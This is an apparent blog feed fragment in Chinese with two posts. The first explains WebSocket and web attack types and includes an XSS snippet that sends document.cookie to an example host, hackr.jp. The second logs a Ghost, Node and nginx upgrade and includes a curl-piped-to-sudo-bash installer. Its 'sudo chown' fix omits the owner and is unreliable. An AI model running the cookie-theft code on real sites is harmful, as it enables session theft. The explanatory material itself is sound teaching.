<p>WebSocket&#xFF0C;&#x5373;Web&#x6D4F;&#x89C8;&#x5668;&#x4E0E;Web&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x5168;&#x53CC;&#x5DE5;&#x901A;&#x4FE1;&#x6807;&#x51C6;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;Ajax&#x548C;Comet&#x91CC;XMLHttpRequest&#x9644;&#x5E26;&#x7684;&#x7F3A;&#x9677;&#x6240;&#x5F15;&#x8D77;&#x7684;&#x95EE;&#x9898;&#x3002;&#x4E00;&#x65E6;Web&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x8D77;WebSocket&#x534F;&#x8BAE;&#x7684;&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#xFF0C;&#x4E4B;&#x540E;&#x6240;&#x6709;&#x7684;&#x901A;&#x4FE1;&#x90FD;&#x4F9D;&#x9760;&#x8FD9;&#x4E2A;&#x4E13;&#x7528;&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x3002;&#x901A;&#x4FE1;&#x8FC7;&#x7A0B;&#x4E2D;&#x53EF;&#x4E92;&#x76F8;&#x53D1;&#x9001;JSON&#x3001;XML&#x3001;HTML&#x6216;&#x56FE;&#x7247;&#x7B49;&#x4EFB;&#x610F;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x3002;&#x7531;&#x4E8E;&#x662F;&#x5EFA;&#x7ACB;&#x5728;HTTP&#x57FA;&#x7840;&#x4E0A;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x56E0;&#x6B64;&#x8FDE;&#x63A5;&#x7684;&#x53D1;&#x8D77;&#x65B9;&#x4ECD;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x800C;&#x4E00;&#x65E6;&#x786E;&#x7ACB;WebSocket&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#xFF0C;&#x4E0D;&#x8BBA;&#x670D;&#x52A1;&#x5668;&#x8FD8;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4EFB;&#x610F;&#x4E00;&#x65B9;&#x90FD;&#x53EF;&#x76F4;&#x63A5;&#x5411;&#x5BF9;&#x65B9;&#x53D1;&#x9001;&#x62A5;&#x6587;&#x3002;</p>
<p>WebSocket&#x534F;&#x8BAE;&#x652F;&#x6301;&#x7531;&#x670D;&#x52A1;&#x5668;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x63A8;&#x9001;&#x6570;&#x636E;&#x7684;&#x63A8;&#x9001;&#x529F;&#x80FD;&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x76F4;&#x63A5;&#x53D1;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x4E0D;&#x5FC5;&#x7B49;&#x5F85;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x3002;&#x5728;&#x51CF;&#x5C11;&#x901A;&#x4FE1;&#x91CF;&#x65B9;&#x9762;&#xFF0C;&#x53EA;&#x8981;&#x5EFA;&#x7ACB;&#x8D77;WebSocket&#x8FDE;&#x63A5;&#xFF0C;&#x5C31;&#x5E0C;&#x671B;&#x4E00;&#x76F4;&#x4FDD;&#x6301;&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x3002;&#x548C;HTTP&#x76F8;&#x6BD4;&#xFF0C;&#x4E0D;&#x4F46;&#x6BCF;&#x6B21;&#x8FDE;&#x63A5;&#x65F6;&#x7684;&#x603B;&#x5F00;&#x9500;&#x51CF;&#x5C11;&#xFF0C;&#x800C;&#x4E14;&#x7531;&#x4E8E;WebSocket&#x7684;&#x9996;&#x90E8;&#x4FE1;&#x606F;&#x5F88;&#x5C0F;&#xFF0C;&#x901A;&#x4FE1;&#x91CF;&#x4E5F;&#x76F8;&#x5E94;&#x51CF;&#x5C11;&#x4E86;&#x3002;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0;WebSocket&#x901A;&#x4FE1;&#xFF0C;&#x5728;HTTP&#x8FDE;&#x63A5;&#x5EFA;&#x7ACB;&#x4E4B;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x201C;&#x63E1;&#x624B;&#x201D;&#xFF08;Handshaking&#xFF09;&#x7684;&#x6B65;&#x9AA4;&#x3002;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0;WebSocket&#x901A;&#x4FE1;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x5230;HTTP&#x7684;Upgrade&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#xFF0C;&#x544A;&#x77E5;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x534F;&#x8BAE;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x63E1;&#x624B;&#x7684;&#x76EE;&#x7684;&#x3002;&#x5BF9;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;101 Switching Protocols&#x7684;&#x54CD;&#x5E94;&#x3002;&#x6210;&#x529F;&#x63E1;&#x624B;&#x786E;&#x7ACB;WebSocket&#x8FDE;&#x63A5;&#x4E4B;&#x540E;&#xFF0C;&#x901A;&#x4FE1;&#x65F6;&#x4E0D;&#x518D;&#x4F7F;&#x7528;HTTP&#x7684;&#x6570;&#x636E;&#x5E27;&#xFF0C;&#x800C;&#x91C7;&#x7528;WebSocket&#x72EC;&#x7ACB;&#x7684;&#x6570;&#x636E;&#x5E27;&#x3002;</p>
<pre><code class="language-javascript">// JavaScript&#x8C03;&#x7528; &quot;The WebSocket API&quot;
// &#x6BCF;50ms&#x53D1;&#x9001;&#x4E00;&#x6B21;&#x6570;&#x636E;
var socket = new WebSocket(&apos;ws://bingmeishi.example.com:123/updates&apos;);
socket.onopen = function () {
  setInterval(function() {
    if (socket.bufferedAmount == 0) socket.send(getUpdateData());
    }, 50);
};
</code></pre>
<h2 id="web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">Web&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;</h2>
<p>HTTP&#x534F;&#x8BAE;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x5177;&#x5907;&#x5B89;&#x5168;&#x529F;&#x80FD;&#xFF0C;&#x5373;&#x5E76;&#x4E0D;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x6B64;&#x534F;&#x8BAE;&#x672C;&#x8EAB;&#x51E0;&#x4E4E;&#x4E0D;&#x4F1A;&#x6210;&#x4E3A;&#x653B;&#x51FB;&#x7684;&#x5BF9;&#x8C61;&#x3002;&#x5E94;&#x7528;HTTP&#x534F;&#x8BAE;&#x7684;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4EE5;&#x53CA;&#x8FD0;&#x884C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;Web&#x5E94;&#x7528;&#x7B49;&#x8D44;&#x6E90;&#x624D;&#x662F;&#x653B;&#x51FB;&#x76EE;&#x6807;&#x3002;&#x5C31;&#x62FF;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x65F6;&#x4F1A;&#x7528;&#x5230;&#x7684;SSH&#x534F;&#x8BAE;&#x6765;&#x8BF4;&#xFF0C;SSH&#x5177;&#x5907;&#x534F;&#x8BAE;&#x7EA7;&#x522B;&#x7684;&#x8BA4;&#x8BC1;&#x53CA;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;&#x7B49;&#x529F;&#x80FD;&#xFF0C;HTTP&#x534F;&#x8BAE;&#x5219;&#x6CA1;&#x6709;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5F00;&#x53D1;&#x8005;&#x9700;&#x8981;&#x81EA;&#x884C;&#x8BBE;&#x8BA1;&#x5E76;&#x5F00;&#x53D1;&#x8BA4;&#x8BC1;&#x53CA;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#x6765;&#x6EE1;&#x8DB3;Web&#x5E94;&#x7528;&#x7684;&#x5B89;&#x5168;&#x3002;</p>
<h3 id="%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F">&#x5E94;&#x7528;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;</h3>
<p>&#x4E3B;&#x52A8;&#x653B;&#x51FB; active attack &#x662F;&#x6307;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;Web&#x5E94;&#x7528;&#xFF0C;&#x628A;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x4F20;&#x5165;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x3002;&#x7531;&#x4E8E;&#x8BE5;&#x6A21;&#x5F0F;&#x662F;&#x76F4;&#x63A5;&#x9488;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x8D44;&#x6E90;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF0C;&#x56E0;&#x6B64;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x90A3;&#x4E9B;&#x8D44;&#x6E90;&#x3002;&#x4E3B;&#x52A8;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x91CC;&#x5177;&#x6709;&#x4EE3;&#x8868;&#x6027;&#x7684;&#x653B;&#x51FB;&#x662F;SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x548C;OS&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x88AB;&#x52A8;&#x653B;&#x51FB; passive attack &#x662F;&#x6307;&#x5229;&#x7528;<strong>&#x5708;&#x5957;&#x7B56;&#x7565;</strong>&#x6267;&#x884C;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x3002;&#x5728;&#x88AB;&#x52A8;&#x653B;&#x51FB;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x4E0D;&#x76F4;&#x63A5;&#x5BF9;&#x76EE;&#x6807;Web&#x5E94;&#x7528;&#x8BBF;&#x95EE;&#x53D1;&#x8D77;&#x653B;&#x51FB;&#xFF0C;&#x800C;&#x662F;&#x8BF1;&#x4F7F;&#x7528;&#x6237;&#x89E6;&#x53D1;&#x5DF2;&#x8BBE;&#x7F6E;&#x597D;&#x7684;&#x9677;&#x9631;&#xFF0C;&#x9677;&#x9631;&#x4F1A;&#x542F;&#x52A8;&#x53D1;&#x9001;&#x5DF2;&#x5D4C;&#x5165;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x7684;HTTP&#x8BF7;&#x6C42;&#x3002;&#x5177;&#x6709;&#x4EE3;&#x8868;&#x6027;&#x7684;&#x653B;&#x51FB;&#x662F;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB; xss &#x548C;&#x8DE8;&#x7AD9;&#x70B9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020; csrf&#x3002;</p>
<p>&#x5176;&#x4E2D;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB; Cross-Site Scripting &#x662F;&#x6307;&#x901A;&#x8FC7;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x7684; Web &#x7F51;&#x7AD9;&#x6CE8;&#x518C;&#x7528;&#x6237;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x8FD0;&#x884C;&#x975E;&#x6CD5;&#x7684;HTML&#x6807;&#x7B7E;&#x6216;JavaScript&#x8FDB;&#x884C;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;&#x3002;&#x5E38;&#x89C1;&#x4E8E;&#x865A;&#x5047;&#x8F93;&#x5165;&#x8868;&#x5355;&#x9A97;&#x53D6;&#x7528;&#x6237;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x3001;&#x5229;&#x7528;&#x811A;&#x672C;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x7684;Cookie&#x503C;&#xFF0C;&#x88AB;&#x5BB3;&#x8005;&#x5728;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5E2E;&#x52A9;&#x653B;&#x51FB;&#x8005;&#x53D1;&#x9001;&#x6076;&#x610F;&#x8BF7;&#x6C42;&#x4EE5;&#x53CA;&#x663E;&#x793A;&#x4F2A;&#x9020;&#x7684;&#x6587;&#x7AE0;&#x6216;&#x56FE;&#x7247;&#x3002;</p>
<pre><code class="language-javascript">var content = escape(document.cookie);
document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);
document.write(content);
document.write(&quot;&gt;&quot;)
</code></pre>
<p>SQL&#x6CE8;&#x5165;&#xFF08;SQL Injection&#xFF09;&#x662F;&#x6307;&#x9488;&#x5BF9;Web&#x5E94;&#x7528;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;&#x8FD0;&#x884C;&#x975E;&#x6CD5;&#x7684;SQL&#x800C;&#x4EA7;&#x751F;&#x7684;&#x653B;&#x51FB;&#x3002;&#x901A;&#x5E38;&#x6709;&#x975E;&#x6CD5;&#x67E5;&#x770B;&#x6216;&#x7BE1;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5185;&#x7684;&#x6570;&#x636E;&#x3001;&#x89C4;&#x907F;&#x8BA4;&#x8BC1;&#x3001;&#x6267;&#x884C;&#x548C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E1A;&#x52A1;&#x5173;&#x8054;&#x7684;&#x7A0B;&#x5E8F;&#x7B49;&#x540E;&#x679C;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Ghost 更新与迁移]]></title><description><![CDATA[Ubuntu 最近 Ghost 以及 Node 版本更新过程小结。]]></description><link>yourdomain.com/newghostzs/</link><guid isPermaLink="false">60fac2bca763a10c85416efc</guid><category><![CDATA[GHOSTblog]]></category><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Fri, 23 Jul 2021 13:38:41 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/09/ghostbg.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: html--><iframe width="100%" height="300" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/playlists/1282481617&amp;color=%23546854&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true"></iframe><div style="font-size: 10px; color: #cccccc;line-break: anywhere;word-break: normal;overflow: hidden;white-space: nowrap;text-overflow: ellipsis; font-family: Interstate,Lucida Grande,Lucida Sans Unicode,Lucida Sans,Garuda,Verdana,Tahoma,sans-serif;font-weight: 100;"><a href="https://soundcloud.com/hvmqw3ekc2fe" title="zairesinatra" target="_blank" style="color: #cccccc; text-decoration: none;">zairesinatra</a> &#xB7; <a href="https://soundcloud.com/hvmqw3ekc2fe/sets/zsxzy" title="zsxzy" target="_blank" style="color: #cccccc; text-decoration: none;">zsxzy</a></div><!--kg-card-end: html--><!--kg-card-begin: markdown--><img src="yourdomain.com/content/images/2021/09/ghostbg.png" alt="Ghost &#x66F4;&#x65B0;&#x4E0E;&#x8FC1;&#x79FB;"><p>&#x7531;&#x4E8E; Githubpage &#x9759;&#x6001;&#x7F16;&#x8BD1;&#x7684; Ghost &#x5728;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x4E0E;&#x6548;&#x679C;&#x4E0A;&#x7A0D;&#x900A;&#x4E8E;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x7684;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#xFF0C;&#x4E3A;&#x540C;&#x6B65;&#x9700;&#x6C42;&#xFF0C;&#x8BB0;&#x5F55;&#x672C;&#x6B21;&#x4E91;&#x670D;&#x52A1;&#x5668; Ubuntu &#x4E2D; Ghost &#x4E0E; Node &#x7248;&#x672C;&#x66F4;&#x65B0;&#x8FC7;&#x7A0B;&#x4EE5;&#x53CA; Nginx &#x914D;&#x7F6E;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<h3 id="node">Node</h3>
<ul>
<li>&#x6700;&#x65B0; Ghost &#x7248;&#x672C;&#x9700;&#x8981; Node@14.x -&gt; &#x5B89;&#x88C5;&#x9002;&#x7528; Ubuntu &#x7684; <a href="https://github.com/nodesource/distributions">&#x4E8C;&#x8FDB;&#x5236;&#x53D1;&#x884C;&#x7248;</a></li>
</ul>
<pre><code class="language-shell"># Using Ubuntu &#x6DFB;&#x52A0; Node.js ppa(Person Package achives) &#x5B89;&#x88C5; Node.js
# cURL is an abbreviation for Client URL Request Library which is used to transfer data from one place to another place. 
# -f (--fail) &#x8868;&#x793A;&#x5728;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x65F6;, &#x963B;&#x6B62;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x8868;&#x793A;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#x7684; html &#x9875;&#x9762;
# -S (--show-error) &#x4F7F;curl&#x5728;&#x5931;&#x8D25;&#x65F6;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x6D88;&#x606F; -s (--silent) &#x4E0D;&#x663E;&#x793A;&#x8FDB;&#x5EA6;&#x8868;&#x6216;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x7684;&#x5B89;&#x9759;&#x6A21;&#x5F0F;
# -L (--location) &#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x62A5;&#x544A;&#x8BF7;&#x6C42;&#x7684;&#x9875;&#x9762;&#x5DF2;&#x79FB;&#x52A8;&#x5230;&#x5176;&#x4ED6;&#x4F4D;&#x7F6E;,&#x5C06;&#x4F7F;curl&#x5728;&#x65B0;&#x4F4D;&#x7F6E;&#x4E0A;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x8BF7;&#x6C42;
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
sudo apt-get install -y nodejs
node -v
# v14.17.2
</code></pre>
<h3 id="ghost">Ghost</h3>
<p>Ghost@v3 &#x9700;&#x5148;&#x8FD0;&#x884C; <code>ghost update v3</code> &#x83B7;&#x53D6;&#x6700;&#x65B0;&#x7684; v3.x &#x7248;&#x672C;&#xFF0C;&#x518D;&#x901A;&#x8FC7; <code>ghost update</code> &#x83B7;&#x53D6; v4&#x3002;</p>
<ul>
<li>&#x66F4;&#x65B0; Ghost &#x671F;&#x95F4;&#x51FA;&#x73B0;&#x76EE;&#x5F55;&#x6240;&#x5C5E;&#x6743;&#x9650;&#x95EE;&#x9898; =&gt; &#x7ED9; Ghost &#x6587;&#x4EF6;&#x5939;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6743;&#x9650;</li>
</ul>
<pre><code class="language-shell">sudo systemctl is-active ghost_zairesinatra-com
&#x2714; Checking system Node.js version - found v10.24.0&#x3001;Ensuring user is not logged in as ghost user
&#x2716; Checking if logged in user is directory owner
&#x2716; Checking current folder permissions
&#x2714; Checking folder permissions&#x3001;Checking file permissions&#x3001;Checking content folder ownership&#x3001;Checking memory availability&#x3001;Checking free space
One or more errors occurred.

1) Checking if logged in user is directory owner

Message: Your user does not own the directory /var/www/ghost and is also not a member of the owning group.
You must either log in with the user that owns the directory or add your user to the owning group.
Help: https://ghost.org/docs/install/ubuntu/#create-a-new-user

2) Checking current folder permissions

Message: The directory /var/www/ghost is not writable by your user. You must grant write access and try again.
Help: https://ghost.org/docs/install/ubuntu/#create-a-directory

Debug Information:
OS: Ubuntu, v18.04.4 LTS&#x3001;Node Version: v10.24.0&#x3001;Ghost Version: 3.41.9&#x3001;Ghost-CLI Version: 1.17.3&#x3001;Environment: production&#x3001;Command: &apos;ghost update&apos;

Try running ghost doctor to check your system for known issues.
</code></pre>
<pre><code class="language-shell"># &#x89E3;&#x51B3;&#x65B9;&#x6CD5;
sudo chown /var/www/ghost
</code></pre>
<ul>
<li>&#x66F4;&#x65B0;&#x524D;&#x51FA;&#x73B0;&#x62A5;&#x9519; =&gt; ghost-cli@1.5.0 &#x540E; root &#x4E0D;&#x5141;&#x8BB8;&#x8FD0;&#x884C; Ghost &#x547D;&#x4EE4;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5F53;&#x524D;&#x5B89;&#x88C5;&#x8FC1;&#x79FB;&#x5230;&#x65B0;&#x7684; Linux &#x7528;&#x6237;</li>
</ul>
<pre><code class="language-shell">We discovered that you are using the DigitalOcean One-Click install. You need to create a user with regular account privileges and migrate your installation to this user.
</code></pre>
<ul>
<li>&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x6DFB;&#x52A0;&#x5230; sudo &#x7EC4;</li>
</ul>
<pre><code class="language-shell">$ adduser &lt;user&gt;
$ usermod -aG sudo &lt;user&gt;
</code></pre>
<ul>
<li>&#x521B;&#x5EFA;&#x65B0;&#x5B9E;&#x4F8B;&#x6587;&#x4EF6;&#x5E76;&#x79FB;&#x52A8;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E; =&gt; &#x6587;&#x4EF6;&#x4ECE;&#x5C5E;&#x5173;&#x7CFB;&#x7ED9;&#x4E88;&#x65B0;&#x7528;&#x6237;</li>
</ul>
<pre><code class="language-shell">$ mkdir -p /home/&lt;user&gt;/.ghost/
$ chown &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.ghost
$ mv /root/.ghost/config /home/&lt;user&gt;/.ghost/config
$ chown &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.ghost/config
</code></pre>
<ul>
<li>&#x5207;&#x6362;&#x5230; ghost &#x5B89;&#x88C5;&#x76EE;&#x5F55; /var/www/ghost &#x4EE5;&#x66F4;&#x6539;&#x6240;&#x6709;&#x6743;&#xFF0C;&#x5E76;&#x4EE5;&#x65B0;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;</li>
</ul>
<pre><code class="language-shell">$ cd /var/www/ghost
$ find . -group root -user root -exec chown &lt;user&gt;:&lt;user&gt; {} \;
$ su - &lt;user&gt;
</code></pre>
<ul>
<li>&#x7EE7;&#x7EED; ghost &#x66F4;&#x65B0;&#xFF1B;&#x542F;&#x52A8;&#x540E;&#x4E3A;&#x975E; https &#x72B6;&#x6001;&#xFF0C;&#x9700;&#x914D;&#x7F6E; config.production.json &#x6587;&#x4EF6;&#x540E;&#x91CD;&#x542F;</li>
</ul>
<pre><code class="language-shell">$ ghost update v3
+ sudo systemctl is-active ghost_zairesinatra-com
&#x2714; Checking system Node.js version - found v14.17.2
&#x2714; Ensuring user is not logged in as ghost user
&#x2714; Checking if logged in user is directory owner
&#x2714; Checking current folder permissions
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking content folder ownership
&#x2714; Checking memory availability
&#x2714; Checking free space
&#x2714; Checking for available migrations
&#x2714; Checking for latest Ghost version

# 3.42.5

This release contains a security patch.

* &#x1F512; Added a way to hide the secret settings once they are set - Thibaut Patel

---

View the changelogs for full details:
* Ghost - https://github.com/tryghost/ghost/compare/3.42.4...3.42.5
* Ghost-Admin - https://github.com/tryghost/admin/compare/3.42.4...3.42.5

&#x2714; Fetched release notes
Version already installed.
&#x2139; Downloading and updating Ghost [skipped]
&#x2714; Linking latest Ghost and recording versions
&#x2139; Removing old Ghost versions [skipped]
newghostzs@VM-4-10-ubuntu:/var/www/ghost$ ghost update
+ sudo systemctl is-active ghost_zairesinatra-com
&#x2714; Checking system Node.js version - found v14.17.2
&#x2714; Ensuring user is not logged in as ghost user
&#x2714; Checking if logged in user is directory owner
&#x2714; Checking current folder permissions
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking content folder ownership
&#x2714; Checking memory availability
&#x2714; Checking free space
&#x2714; Checking for available migrations
&#x2714; Checking for latest Ghost version

# 4.10.1

* &#x1F41B; Fixed GScan error when handling partials with undefined names - Thibaut Patel

---

View the changelogs for full details:
* Ghost - https://github.com/tryghost/ghost/compare/v4.10.0...v4.10.1
* Admin - https://github.com/tryghost/admin/compare/v4.10.0...v4.10.1

&#x2714; Fetched release notes
&#x2714; Downloading and updating Ghost to v4.10.1


Checking theme compatibility for Ghost 4.10.1

&#x2714; Your theme is compatible.

You can also check theme compatibility at https://gscan.ghost.org

Please review the full list of breaking changes at https://ghost.org/docs/changes/

? Are you sure you want to proceed with migrating to Ghost 4.10.1? Yes
&#x2714; Updating to a major version
&#x2714; Linking latest Ghost and recording versions
&#x2714; Removing old Ghost versions
</code></pre>
<h3 id="nginx">Nginx</h3>
<p>&#x8003;&#x8651;&#x5230;&#x76F4;&#x63A5;&#x8F93;&#x5165;&#x6839;&#x57DF;&#x540D;&#x91CD;&#x5B9A;&#x5411;&#x5230; www &#x7684;&#x9875;&#x9762;&#xFF0C;&#x5728; ghost &#x81EA;&#x5E26;&#x751F;&#x6210;&#x7684; nginx ssl &#x914D;&#x7F6E;&#x5916;&#xFF0C;&#x989D;&#x5916;&#x81EA;&#x884C;&#x5199;&#x4E00;&#x4E2A; nginx &#x91CD;&#x5B9A;&#x5411;&#x7684; conf &#x914D;&#x7F6E;&#x3002;</p>
<pre><code class="language-shell"># sites-available &#x4E2D;&#x7684; zs.com-ssl.conf
server {
	#&#x76D1;&#x542C; 80 &#x548C; 443&#x7AEF;&#x53E3;
        listen 80;
        listen 443 ssl http2;
        #&#x57DF;&#x540D;
        server_name	zs.com;
        # &#x653E;&#x7F6E;&#x7684;&#x9879;&#x76EE;&#x8DEF;&#x5F84;
        root /var/www/html;
        # &#x663E;&#x793A;&#x9996;&#x9875;
        index index.html;
        # &#x914D;&#x7F6E;ssl&#x8BC1;&#x4E66;&#x7684;&#x4F4D;&#x7F6E;-&#x653E;&#x7F6E;&#x4F4D;&#x7F6E;
        # &#x4E5F;&#x53EF;&#x901A;&#x8FC7; ghost config url https://xxx.com &#x4E0E; ghost setup nginx ssl &#x5B8C;&#x6210;
        # ghost &#x521D;&#x6B21;&#x8BBE;&#x7F6E;&#x4E86;url&#x540E;&#x53EF;&#x901A;&#x8FC7; ghost setup ssl &#x76F4;&#x63A5;&#x751F;&#x6210; ssl nginx &#x914D;&#x7F6E;
        ssl_certificate	/etc/nginx/ssl/zs.com_nginx/zs.com_bundle.crt;
        ssl_certificate_key	/etc/nginx/ssl/zs.com_nginx/zs.com.key;
        #&#x5F00;&#x542F;&#x5F3A;&#x5236;http&#x8DF3;&#x8F6C;https
        if ($server_port = 80){
       	rewrite ^(/.*)$ https://$host$1 permanent;
       	}
	location / {
		return 301 https://www.zs.com$request_uri;
	}
}
</code></pre>
<pre><code class="language-shell"># &#x5EFA;&#x7ACB;&#x8F6F;&#x8FDE;&#x63A5;
$ ln -s /etc/nginx/sites-available/zs.com-ssl.conf /etc/nginx/sites-enabled/zs.com-ssl.conf
</code></pre>
<pre><code class="language-shell"># &#x6D4B;&#x8BD5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;
$ sudo nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
# &#x91CD;&#x542F;&#x670D;&#x52A1;
$ sudo nginx -s reload
</code></pre>
<h3 id="lets-encrypt">Let&apos;s Encrypt</h3>
